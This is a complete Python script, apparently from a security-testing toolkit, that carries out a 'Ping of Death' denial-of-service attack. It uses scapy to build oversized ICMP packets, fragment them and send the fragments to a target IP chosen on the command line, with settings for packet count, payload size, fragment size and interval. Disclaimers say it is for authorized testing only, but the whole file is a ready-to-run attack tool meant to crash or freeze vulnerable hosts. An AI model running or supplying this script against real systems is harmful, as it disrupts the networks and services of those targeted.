#!/usr/bin/env python3
"""
Ping of Death Attack Script

This script implements a classic "Ping of Death" attack by sending oversized ICMP packets
to a target system. The packets are fragmented to bypass network restrictions and can
cause vulnerable systems to crash, freeze, or reboot when they attempt to reassemble
the fragments.

The script provides options to customize the attack parameters, including packet size,
fragment size, and the number of packets to send.

WARNING: This tool is for educational and authorized security testing purposes only.
Unauthorized use against systems without explicit permission is illegal and unethical.

Usage:
    python ping_of_death.py <targetIP> [options]

Arguments:
    targetIP: The IP address of the target machine.

Options:
    -c, --count <number>: Number of packets to send (default: 1)
    -s, --size <bytes>: Size of the payload in bytes (default: 65500)
    -f, --fragsize <bytes>: Size of each fragment in bytes (default: 1400)
    -i, --interval <seconds>: Interval between packets in seconds (default: 0.1)
    -v, --verbose: Enable verbose output
    -h, --help: Show this help message

Examples:
    python ping_of_death.py 192.168.1.1
    python ping_of_death.py 192.168.1.1 -c 5 -s 60000 -f 1200 -i 0.5

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os
import sys
import time
import argparse
import ipaddress
from typing import List, Optional, Union, Any, Dict

# Add parent directory to path to import logger
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
try:
    from logger import get_logger
except ImportError:
    # Fallback logging if the centralized logger is not available
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

# Get logger for this module
logger = get_logger(__name__)

# Import scapy with error handling
try:
    from scapy.all import IP, ICMP, fragment, send, conf
except ImportError:
    logger.error("This script requires the scapy library.")
    logger.error("Install it using: pip install scapy")
    sys.exit(1)

# Suppress scapy warnings
conf.verb = 0

def validate_ip_address(ip_address: str) -> bool:
    """
    Validate if a string is a valid IPv4 address.
    
    Args:
        ip_address (str): The IP address to validate
        
    Returns:
        bool: True if the IP address is valid, False otherwise
    """
    try:
        ipaddress.IPv4Address(ip_address)
        return True
    except ValueError:
        return False


class PingOfDeathAttack:
    """
    A class that implements the Ping of Death attack.
    
    This class provides methods to configure and execute a Ping of Death attack
    against a target IP address. It allows customization of various attack parameters
    and provides detailed feedback on the attack progress.
    
    Attributes:
        target_ip (str): The IP address of the target system
        packet_count (int): Number of packets to send
        payload_size (int): Size of the ICMP payload in bytes
        fragment_size (int): Size of each IP fragment in bytes
        interval (float): Time interval between packets in seconds
        verbose (bool): Whether to enable verbose output
    """
    
    def __init__(self, target_ip: str, packet_count: int = 1, payload_size: int = 65500,
                 fragment_size: int = 1400, interval: float = 0.1, verbose: bool = False):
        """
        Initialize the Ping of Death attack with the specified parameters.
        
        Args:
            target_ip (str): The IP address of the target system
            packet_count (int): Number of packets to send (default: 1)
            payload_size (int): Size of the ICMP payload in bytes (default: 65500)
            fragment_size (int): Size of each IP fragment in bytes (default: 1400)
            interval (float): Time interval between packets in seconds (default: 0.1)
            verbose (bool): Whether to enable verbose output (default: False)
        """
        self.target_ip = target_ip
        self.packet_count = max(1, packet_count)  # Ensure at least 1 packet
        self.payload_size = min(max(1, payload_size), 65535)  # Limit size to valid range
        self.fragment_size = min(max(576, fragment_size), 1500)  # Reasonable fragment size range
        self.interval = max(0, interval)  # Non-negative interval
        self.verbose = verbose
        
        # Set scapy verbosity based on verbose flag
        conf.verb = 1 if verbose else 0
        
        # Statistics
        self.start_time = None
        self.end_time = None
        self.packets_sent = 0
        self.fragments_sent = 0
        
        logger.info(f"Initialized Ping of Death attack against {target_ip}")
        if self.verbose:
            logger.info(f"Parameters: {packet_count} packets, {payload_size} bytes payload, "
                       f"{fragment_size} bytes fragment size, {interval} seconds interval")
    
    def create_packet(self) -> IP:
        """
        Create an oversized ICMP packet for the Ping of Death attack.
        
        Returns:
            IP: The constructed IP packet with ICMP payload
        """
        # Create a payload of the specified size
        payload = "X" * self.payload_size
        
        # Create the packet
        packet = IP(dst=self.target_ip) / ICMP() / payload
        
        if self.verbose:
            logger.debug(f"Created packet with {len(payload)} bytes payload")
        
        return packet
    
    def fragment_packet(self, packet: IP) -> List[IP]:
        """
        Fragment the packet into smaller pieces.
        
        Args:
            packet (IP): The packet to fragment
            
        Returns:
            List[IP]: List of fragmented packets
        """
        fragments = fragment(packet, fragsize=self.fragment_size)
        
        if self.verbose:
            logger.debug(f"Fragmented packet into {len(fragments)} fragments")
        
        return fragments
    
    def send_fragments(self, fragments: List[IP]) -> None:
        """
        Send the fragmented packets to the target.
        
        Args:
            fragments (List[IP]): The list of fragmented packets to send
        """
        for i, frag in enumerate(fragments, 1):
            send(frag)
            self.fragments_sent += 1
            if self.verbose:
                logger.debug(f"Sent fragment {i}/{len(fragments)}")
    
    def execute(self) -> Dict[str, Any]:
        """
        Execute the Ping of Death attack with the configured parameters.
        
        Returns:
            Dict[str, Any]: Statistics about the attack execution
        """
        logger.info(f"Starting Ping of Death attack against {self.target_ip}")
        logger.info(f"Parameters: {self.packet_count} packets, {self.payload_size} bytes payload, "
                  f"{self.fragment_size} bytes fragment size, {self.interval} seconds interval")
        
        self.start_time = time.time()
        self.packets_sent = 0
        self.fragments_sent = 0
        
        try:
            for i in range(1, self.packet_count + 1):
                logger.info(f"Sending packet {i}/{self.packet_count}")
                self.packets_sent += 1
                
                # Create and fragment the packet
                packet = self.create_packet()
                fragments = self.fragment_packet(packet)
                
                # Send the fragments
                logger.info(f"Sending {len(fragments)} fragments")
                self.send_fragments(fragments)
                
                # Wait for the specified interval before sending the next packet
                if i < self.packet_count and self.interval > 0:
                    if self.verbose:
                        logger.debug(f"Waiting {self.interval} seconds before sending next packet")
                    time.sleep(self.interval)
            
            logger.info("Ping of Death attack completed successfully")
            
        except KeyboardInterrupt:
            logger.warning("Attack interrupted by user")
        except Exception as e:
            logger.error(f"Error during attack: {str(e)}")
        finally:
            self.end_time = time.time()
            stats = self._get_statistics()
            self._print_summary(stats)
            return stats
            
    def _get_statistics(self) -> Dict[str, Any]:
        """
        Get statistics about the attack execution.
        
        Returns:
            Dict[str, Any]: Statistics including packets sent, fragments sent, duration, etc.
        """
        end_time = self.end_time or time.time()
        start_time = self.start_time or end_time
        duration = end_time - start_time
        
        return {
            "target": self.target_ip,
            "packets_sent": self.packets_sent,
            "fragments_sent": self.fragments_sent,
            "payload_size": self.payload_size,
            "fragment_size": self.fragment_size,
            "duration_seconds": duration,
            "fragments_per_second": self.fragments_sent / duration if duration > 0 else 0
        }
    
    def _print_summary(self, stats: Dict[str, Any]) -> None:
        """
        Print a summary of the attack execution.
        
        Args:
            stats (Dict[str, Any]): Statistics from _get_statistics()
        """
        logger.info("=" * 50)
        logger.info("Ping of Death Attack Summary")
        logger.info("=" * 50)
        logger.info(f"Target: {stats['target']}")
        logger.info(f"Packets sent: {stats['packets_sent']}")
        logger.info(f"Fragments sent: {stats['fragments_sent']}")
        logger.info(f"Payload size: {stats['payload_size']} bytes")
        logger.info(f"Fragment size: {stats['fragment_size']} bytes")
        logger.info(f"Duration: {stats['duration_seconds']:.2f} seconds")
        logger.info(f"Rate: {stats['fragments_per_second']:.2f} fragments/second")
        logger.info("=" * 50)


def start_ping_of_death_attack(target_ip: str, packet_count: int = 1, payload_size: int = 65500,
                             fragment_size: int = 1400, interval: float = 0.1, verbose: bool = False) -> Dict[str, Any]:
    """
    Launch a Ping of Death attack against the specified target IP.

    This function constructs oversized ICMP packets, fragments them,
    and sends all fragments to the target IP address.

    Args:
        target_ip (str): The IP address of the target system
        packet_count (int, optional): Number of packets to send. Defaults to 1.
        payload_size (int, optional): Size of the ICMP payload in bytes. Defaults to 65500.
        fragment_size (int, optional): Size of each IP fragment in bytes. Defaults to 1400.
        interval (float, optional): Time interval between packets in seconds. Defaults to 0.1.
        verbose (bool, optional): Whether to enable verbose output. Defaults to False.
        
    Returns:
        Dict[str, Any]: Statistics about the attack execution
    """
    # Validate the target IP address
    if not validate_ip_address(target_ip):
        logger.error(f"'{target_ip}' is not a valid IP address")
        return {"error": f"Invalid IP address: {target_ip}", "success": False}

    try:
        # Create and execute the attack
        attack = PingOfDeathAttack(
            target_ip=target_ip,
            packet_count=packet_count,
            payload_size=payload_size,
            fragment_size=fragment_size,
            interval=interval,
            verbose=verbose
        )
        return attack.execute()

    except KeyboardInterrupt:
        logger.warning("Attack interrupted by user")
        return {"error": "Attack interrupted by user", "success": False}
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        return {"error": str(e), "success": False}


def parse_arguments() -> argparse.Namespace:
    """
    Parse command-line arguments for the Ping of Death attack.
    
    Returns:
        argparse.Namespace: The parsed command-line arguments
    """
    parser = argparse.ArgumentParser(
        description="Ping of Death Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python ping_of_death.py 192.168.1.1\n"
            "  python ping_of_death.py 192.168.1.1 -c 5 -s 60000 -f 1200 -i 0.5\n\n"
            "WARNING: Use only for educational purposes or authorized security testing."
        )
    )
    
    parser.add_argument(
        "target_ip",
        help="The IP address of the target machine"
    )
    
    parser.add_argument(
        "-c", "--count",
        type=int,
        default=1,
        help="Number of packets to send (default: 1)"
    )
    
    parser.add_argument(
        "-s", "--size",
        type=int,
        default=65500,
        help="Size of the payload in bytes (default: 65500)"
    )
    
    parser.add_argument(
        "-f", "--fragsize",
        type=int,
        default=1400,
        help="Size of each fragment in bytes (default: 1400)"
    )
    
    parser.add_argument(
        "-i", "--interval",
        type=float,
        default=0.1,
        help="Interval between packets in seconds (default: 0.1)"
    )
    
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )
    
    return parser.parse_args()


if __name__ == '__main__':
    # Display ethical notice
    print("=" * 80)
    print("WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY")
    print("Using this tool against systems without permission is ILLEGAL")
    print("The authors assume NO LIABILITY for misuse of this software")
    print("=" * 80)
    print()
    
    try:
        # Parse command-line arguments
        args = parse_arguments()
        
        # Launch the attack
        start_ping_of_death_attack(
            target_ip=args.target_ip,
            packet_count=args.count,
            payload_size=args.size,
            fragment_size=args.fragsize,
            interval=args.interval,
            verbose=args.verbose
        )
    except Exception as e:
        logger.error(f"Unhandled error: {str(e)}")
        sys.exit(1)